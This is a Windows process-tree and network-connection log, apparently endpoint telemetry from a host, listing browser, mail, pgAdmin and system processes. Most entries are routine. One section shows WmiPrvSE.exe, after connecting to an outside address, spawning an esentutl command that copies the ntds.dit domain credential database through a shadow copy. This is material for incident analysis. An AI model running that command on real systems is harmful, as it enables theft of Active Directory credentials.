+  └─ msedge.exe (PID 12108): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --instant-process --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=268904263750 --mojo-platform-channel-handle=3432 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"  [x6]
+  └─ msedge.exe (PID 12596): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --extension-process --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=268904407689 --mojo-platform-channel-handle=4004 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"  [x6]
+  └─ msedge.exe (PID 16944): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=268908170153 --mojo-platform-channel-handle=6004 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"  [x2]
+  └─ msedge.exe (PID 2836): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=12 --launch-time-ticks=268908350938 --mojo-platform-channel-handle=5472 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"
+  └─ msedge.exe (PID 5072): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=13 --launch-time-ticks=268909056521 --mojo-platform-channel-handle=6356 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"  [x4]
+  └─ msedge.exe (PID 9356): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=zh-CN --service-sandbox-type=audio --mojo-platform-channel-handle=5344 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:8"  [x3]
+  └─ msedge.exe (PID 17268): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=zh-CN --service-sandbox-type=service --mojo-platform-channel-handle=6732 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:8"  [x11]
+  └─ msedge.exe (PID 8484): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --launch-time-ticks=286902107514 --mojo-platform-channel-handle=5920 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1"  [x2]
+  └─ msedge.exe (PID 17876): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=15 --launch-time-ticks=286902958684 --mojo-platform-channel-handle=3508 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1"  [x2]
+  └─ msedge.exe (PID 13728): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=17 --launch-time-ticks=286903055063 --mojo-platform-channel-handle=6524 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1"
+msedge.exe (PID 10316): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=101 --launch-time-ticks=266859991076 --mojo-platform-channel-handle=5132 --field-trial-handle=2132,i,769058598317916170,12310455360644805165,131072 /prefetch:1"
+msedge.exe (PID 16860): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --instant-process --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=102 --launch-time-ticks=266860027034 --mojo-platform-channel-handle=4860 --field-trial-handle=2132,i,769058598317916170,12310455360644805165,131072 /prefetch:1"
+msedge.exe (PID 10540): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window /prefetch:5"
+      connected to → 40.90.184.82:443
+  └─ msedge.exe (PID 7876): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1960 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:2"  [x7]
+  └─ msedge.exe (PID 18324): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=zh-CN --service-sandbox-type=none --mojo-platform-channel-handle=2040 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:3"  [x7]
+        connected to → 202.89.233.96:443
+        connected to → 202.89.233.100:443
+        connected to → 18.65.223.6:443
+        connected to → 204.79.197.219:443
+        connected to → 104.70.235.82:443
+        connected to → 184.26.127.40:443
+        connected to → 221.194.154.216:443
+        connected to → 52.139.176.199:443
+        connected to → 52.98.64.18:443
+        connected to → 204.79.197.203:443
+        connected to → 218.26.76.178:443
+        connected to → 184.26.127.18:443
+        connected to → 202.89.233.101:443
+        connected to → 13.107.42.16:443
+        connected to → 18.65.223.70:443
+        connected to → 184.25.227.211:443
+        connected to → 13.107.21.200:443
+        connected to → 20.184.57.167:443
+        connected to → 52.231.207.240:443
+        connected to → 52.98.64.2:443
+        connected to → 52.184.81.210:443
+        connected to → 104.46.162.226:443
+        connected to → 13.107.39.203:443
+        connected to → 124.132.138.26:443
+        connected to → 124.132.156.81:443
+        connected to → 184.26.127.17:443
+        connected to → 124.132.138.31:443
+        connected to → 52.182.141.63:443
+        connected to → 23.32.236.163:443
+        connected to → 20.189.173.3:443
+        connected to → 47.93.113.201:80
+        connected to → 184.25.227.195:443
+        connected to → 40.101.146.98:443
+        connected to → 124.132.138.34:443
+        connected to → 211.91.76.52:443
+        connected to → 40.126.35.151:443
+        connected to → 13.75.113.36:443
+        connected to → 40.90.130.197:443
+        connected to → 184.26.127.19:443
+        connected to → 99.84.50.83:443
+        connected to → 204.79.197.200:443
+        connected to → 20.42.65.90:443
+        connected to → 104.75.169.10:443
+        connected to → 218.26.76.132:443
+        connected to → 124.132.156.77:443
+        connected to → 104.70.235.139:443
+        connected to → 115.85.200.164:443
+        connected to → 40.126.16.165:443
+        connected to → 20.190.163.19:443
+        connected to → 13.78.111.198:443
+        connected to → 23.202.35.25:443
+        connected to → 99.84.50.35:443
+        connected to → 52.98.83.178:443
+        connected to → 20.189.173.6:443
+        connected to → 218.26.76.179:443
+  └─ msedge.exe (PID 7988): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=zh-CN --service-sandbox-type=utility --mojo-platform-channel-handle=2572 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:8"  [x7]
+  └─ msedge.exe (PID 15812): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=edge_collections.mojom.CollectionsDataManager --lang=zh-CN --service-sandbox-type=collections --mojo-platform-channel-handle=3028 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:8"  [x7]
+HxOutlook.exe (PID 8248): ""C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe\HxOutlook.exe" -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca" PackageFullName="microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe" ApplicationID="microsoft.windowslive.mail"  [x7]
+      connected to → 52.113.194.132:443
+      connected to → 117.18.232.200:443
+      connected to → 52.177.62.210:443
+      connected to → 23.40.241.249:443
+      connected to → 104.18.24.243:80
+      connected to → 117.18.237.29:80
+      connected to → 52.109.124.116:443
+      connected to → 59.151.131.36:443
+HxTsr.exe (PID 7460): ""C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe\HxTsr.exe" -ServerName:Hx.IPC.Server" PackageFullName="microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe" ApplicationID="ppleae38af2e007f4358a809ac99a64a67c1"  [x13]
+      connected to → 52.98.37.98:443
+      connected to → 13.107.5.88:443
+      connected to → 40.101.144.2:443
+      connected to → 52.98.75.82:443
+      connected to → 52.98.64.34:443
+      connected to → 52.98.89.2:443
+      connected to → 52.98.89.50:443
+      connected to → 52.98.77.242:443
+      connected to → 52.98.64.18:443
+      connected to → 23.205.96.69:443
+      connected to → 40.101.146.194:443
+      connected to → 52.98.64.2:443
+      connected to → 52.98.83.178:443
+      connected to → 52.98.68.2:443
+      connected to → 52.98.89.34:443
+notepad.exe (PID 8316): ""C:\WINDOWS\system32\NOTEPAD.EXE" D:\Log\apt-new.txt"  [x4]
+svchost.exe (PID 11940): "C:\WINDOWS\System32\svchost.exe -k WerSvcGroup"  [x2]
+  └─ WerFault.exe (PID 2904): "werfault.exe /hc /shared Global\cf394333adaa48ee92ff6ff863f5967e /t 13860 /p 8248"
+        connected to → 13.89.179.12:443
+  └─ WerFault.exe (PID 14160): "C:\WINDOWS\system32\WerFault.exe -pss -s 424 -p 13924 -ip 13924"
+backgroundTaskHost.exe (PID 7512): ""C:\WINDOWS\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider" PackageFullName="Microsoft.AAD.BrokerPlugin_1000.19041.1023.0_neutral_neutral_cw5n1h2txyewy" ApplicationID="App"  [x15]
+pgAdmin4.exe (PID 13780): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" "  [x4]
+  └─ pgAdmin4.exe (PID 13808): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x220,0x224,0x228,0x1fc,0x22c,0x7ff8fca170f8,0x7ff8fca17108,0x7ff8fca17"
+  └─ pgAdmin4.exe (PID 14752): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=gpu-process --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAAAAAAADQAAABAAAAAAAAAAAQAAAA0AAAAQAAAAAA"
+  └─ pgAdmin4.exe (PID 16960): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --lang=zh-CN --service-sandbox-type=network --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --start-stack-profiler --mojo-platform-channel-handle=1928 /prefetch:8"  [x4]
+        connected to → 203.208.41.98:443
+  └─ pgAdmin4.exe (PID 8884): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --lang=zh-CN --service-sandbox-type=utility --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --mojo-platform-channel-handle=2272 /prefetch:8"  [x4]
+  └─ pgAdmin4.exe (PID 16648): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=renderer --no-sandbox --file-url-path-alias="/gen=D:\Postgres\pgAdmin 4\bin\gen" --no-zygote --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --disable-gpu-compositing --lang=zh-CN --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform-channel-handle=2496 /prefetch:1"
+    └─ python.exe (PID 6704): ""D:\Postgres\pgAdmin 4\python\python.exe" -s "D:\Postgres\pgAdmin 4\web\pgAdmin4.py""  [x4]
+          connected to → 72.32.157.249:443
+      └─ conhost.exe (PID 2480): "\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1"  [x121]
+      └─ cmd.exe (PID 7780): "C:\WINDOWS\system32\cmd.exe /c "ver""  [x4]
+      └─ cmd.exe (PID 14364): "C:\WINDOWS\system32\cmd.exe /c ""D:\Postgres\pgAdmin 4\runtime\pg_dump.exe" --version""  [x4]
+      └─ cmd.exe (PID 1780): "C:\WINDOWS\system32\cmd.exe /c ""D:\Postgres\pgAdmin 4\runtime\pg_dumpall.exe" --version""  [x4]
+      └─ cmd.exe (PID 7692): "C:\WINDOWS\system32\cmd.exe /c ""D:\Postgres\pgAdmin 4\runtime\pg_restore.exe" --version""  [x4]
+      └─ cmd.exe (PID 14128): "C:\WINDOWS\system32\cmd.exe /c ""D:\Postgres\pgAdmin 4\runtime\psql.exe" --version""  [x4]
+  └─ pgAdmin4.exe (PID 4996): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --lang=zh-CN --service-sandbox-type=none --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --mojo-platform-channel-handle=3516 /prefetch:8"  [x10]
+  └─ pgAdmin4.exe (PID 4064): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --lang=zh-CN --service-sandbox-type=service --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --mojo-platform-channel-handle=2080 /prefetch:8"
+  └─ pgAdmin4.exe (PID 14936): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self --monitor-self-argument=--type=crashpad-handler "--monitor-self-argument=--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --monitor-self-argument=/prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator"
+    └─ pgAdmin4.exe (PID 16104): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --no-periodic-tasks --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x1c4,0x1c8,0x1cc,0x188,0x1d0,0x7ff6d21680d0,0x7ff6d21680e0,0x7ff6d21680f0"
+  └─ pgAdmin4.exe (PID 1472): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=gpu-process --field-trial-handle=1676,12953936231066062489,2618885265361879679,131072 --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAAAAAAADQAAABAAAAAAAAAAAQAAAA0AAAAQAAAAA"  [x3]
+  └─ pgAdmin4.exe (PID 15120): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=renderer --no-sandbox --file-url-path-alias="/gen=D:\Postgres\pgAdmin 4\bin\gen" --no-zygote --field-trial-handle=1676,12953936231066062489,2618885265361879679,131072 --disable-gpu-compositing --lang=zh-CN --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="D:\Postgres\pgAdmin 4\bin" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform-channel-handle=2552 /prefetch:"  [x3]
+  └─ pgAdmin4.exe (PID 18644): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x220,0x224,0x228,0x1fc,0x22c,0x7ff8fcb070f8,0x7ff8fcb07108,0x7ff8fcb07"
+  └─ pgAdmin4.exe (PID 8740): ""D:\Postgres\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x220,0x224,0x228,0x1fc,0x22c,0x7ff8f3e170f8,0x7ff8f3e17108,0x7ff8f3e17"
+WmiPrvSE.exe (PID 17928): "C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding"  [x36]
+      connected to → 124.223.85.207:8084
+  └─ cmd.exe (PID 11420): "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
+    └─ esentutl.exe (PID 14272): "esentutl.exe  /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
+LogonUI.exe (PID 13176): ""LogonUI.exe" /flags:0x0 /state0:0xa379c855 /state1:0x41c64e6d"
+MoUsoCoreWorker.exe (PID 5872): "C:\Windows\System32\mousocoreworker.exe -Embedding"  [x22]
+TSTheme.exe (PID 5172): "C:\WINDOWS\system32\TSTheme.exe -Embedding"  [x15]
+taskhostw.exe (PID 12928): "taskhostw.exe Install $(Arg0)"  [x43]
+svchost.exe (PID 9412): "C:\WINDOWS\system32\svchost.exe -k appmodel -p -s camsvc"  [x24]
+svchost.exe (PID 7816): "C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s wuauserv"  [x20]
+svchost.exe (PID 4016): "C:\WINDOWS\system32\svchost.exe -k wsappx -p -s AppXSvc"  [x25]
+      wrote → C:\Program Files\WindowsApps\Microsoft.Photos.MediaEngineDLC_1.0.0.0_x64__8wekyb3d8bbwe\Photos.DLC.MediaEngine.exe
+TrustedInstaller.exe (PID 13120): "C:\WINDOWS\servicing\TrustedInstaller.exe"  [x33]
+TiWorker.exe (PID 13320): "C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.1525_none_7e00daaa7c97a563\TiWorker.exe -Embedding"  [x33]
+  └─ makecab.exe (PID 11788): ""C:\WINDOWS\system32\makecab.exe" C:\WINDOWS\Logs\CBS\CbsPersist_20220406130334.log C:\WINDOWS\Logs\CBS\CbsPersist_20220406130334.cab"  [x2]
+svchost.exe (PID 4288): "C:\WINDOWS\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc"  [x2]
+AtBroker.exe (PID 12904): "atbroker.exe"  [x8]
+  └─ sethc.exe (PID 15264): ""C:\WINDOWS\System32\Sethc.exe" /AccessibilitySoundAgent"  [x8]
+LogonUI.exe (PID 15308): ""LogonUI.exe" /flags:0x0 /state0:0xa37aa855 /state1:0x41c64e6d"
+WUDFHost.exe (PID 4344): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-4b7c27fb-c9b4-4c9d-9b36-87ff46498622 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-950bdb09-b4aa-4c7a-b40a-f2fef0f43537 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-d88b0433-b7ef-4588-84d2-d1c9c0c61634 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-49723c19-840d-4637-a192-77f8ef801120 -LifetimeId:a18cf492-6c1"
+rdpclip.exe (PID 8284): "rdpclip"  [x9]
+taskhostw.exe (PID 13932): "taskhostw.exe KEYROAMING"  [x12]
+dllhost.exe (PID 10416): "C:\WINDOWS\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}"  [x11]
+svchost.exe (PID 3952): "C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s DsmSvc"  [x9]
+      connected to → 20.86.173.234:80
+      connected to → 52.188.50.245:80
+      connected to → 168.63.250.82:80
+backgroundTaskHost.exe (PID 12780): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca" PackageFullName="Microsoft.Windows.ContentDeliveryManager_10.0.19041.1023_neutral_neutral_cw5n1h2txyewy" ApplicationID="App"  [x26]
+      connected to → 52.139.176.199:443
+      connected to → 23.100.93.154:443
+      connected to → 52.184.81.210:443
+LogonUI.exe (PID 15912): ""LogonUI.exe" /flags:0x0 /state0:0xa37b8055 /state1:0x41c64e6d"
+taskhostw.exe (PID 10016): "taskhostw.exe NGCKeyPregen"  [x8]
+GoogleUpdate.exe (PID 12344): ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua /installsource scheduler"  [x10]
+RuntimeBroker.exe (PID 13536): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="microsoft.windowscommunicationsapps_16005.14326.20858.0_x64__8wekyb3d8bbwe" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"  [x12]
+SearchProtocolHost.exe (PID 11616): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-2860491236-3051596471-1450068755-50059_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-2860491236-3051596471-1450068755-50059 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"  "1""  [x10]
+FileCoAuth.exe (PID 15268): ""C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\22.055.0313.0001\FileCoAuth.exe" -Embedding"  [x56]
+      connected to → 51.132.193.105:443
+      connected to → 13.69.239.72:443
+      connected to → 52.168.112.67:443
+      connected to → 52.178.17.3:443
+      connected to → 52.168.117.170:443
+      connected to → 51.104.15.252:443
+      connected to → 20.50.73.10:443
+      connected to → 20.189.173.13:443
+      connected to → 20.189.173.7:443
+      connected to → 20.189.173.14:443
+      wrote → C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\22.055.0313.0001\USERENV.dll
+      connected to → 20.50.73.9:443
+      connected to → 51.132.193.104:443
+      connected to → 20.42.73.26:443
+      connected to → 20.50.201.195:443
+      connected to → 13.89.178.27:443
+      connected to → 104.46.162.226:443
+      connected to → 20.50.201.200:443
+      wrote → C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\22.055.0313.0001\WININET.dll
+      connected to → 51.105.71.136:443
+      connected to → 40.79.189.59:443
+      connected to → 104.208.16.88:443
+      connected to → 20.189.173.15:443
+      connected to → 52.168.117.169:443
+      connected to → 20.44.10.122:443
+      connected to → 51.104.15.253:443
+      connected to → 20.189.173.3:443
+      connected to → 20.50.80.210:443
+      connected to → 13.89.179.8:443
+      connected to → 20.189.173.6:443
+      connected to → 52.182.143.211:443
+LogonUI.exe (PID 12680): ""LogonUI.exe" /flags:0x0 /state0:0xa3742055 /state1:0x41c64e6d"  [x5]
+WUDFHost.exe (PID 18952): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-eeab4833-c876-4ebe-8d7e-f4b8c0667688 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-9c4b003a-8cf7-4ec7-9445-cff5a6b234a6 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-4430935c-7c42-4447-a4e8-54997fb7faf1 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-72a9ea05-a718-4c5e-9b08-68cd2463779e -LifetimeId:a19a9706-25b"
+backgroundTaskHost.exe (PID 15460): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca" PackageFullName="Microsoft.MicrosoftOfficeHub_18.2110.13110.0_x64__8wekyb3d8bbwe" ApplicationID="Microsoft.MicrosoftOfficeHub"  [x12]
+svchost.exe (PID 4064): "C:\WINDOWS\System32\svchost.exe -k wsappx -p -s ClipSVC"  [x14]
+svchost.exe (PID 3280): "C:\WINDOWS\system32\svchost.exe -k LocalSystemNetworkRestricted -s ScDeviceEnum"  [x3]
+RuntimeBroker.exe (PID 6792): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.MicrosoftOfficeHub_18.2110.13110.0_x64__8wekyb3d8bbwe" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"  [x12]
+WUDFHost.exe (PID 4072): ""C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-bc9aa6db-94dc-4dda-bc40-5c8af2c81dd0 -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-2fa72b6b-690a-4365-8613-36ca40102719 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-727239fa-c81c-4b53-b6c6-bec93e2a95f1 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-d847f8c3-f475-4d2b-969f-6db6e250506f -LifetimeId:bcd81c2b-ac4"
+SearchProtocolHost.exe (PID 3660): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe25_ Global\UsGthrCtrlFltPipeMssGthrPipe25 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+RuntimeBroker.exe (PID 8784): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.AAD.BrokerPlugin_1000.19041.1023.0_neutral_neutral_cw5n1h2txyewy" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"  [x8]
+RuntimeBroker.exe (PID 12004): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.Windows.ContentDeliveryManager_10.0.19041.1023_neutral_neutral_cw5n1h2txyewy" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"  [x9]
+taskhostw.exe (PID 14660): "taskhostw.exe"  [x5]
+      connected to → 40.74.108.123:443
+      connected to → 20.44.239.154:443
+sppsvc.exe (PID 14128): "C:\WINDOWS\system32\sppsvc.exe"  [x8]
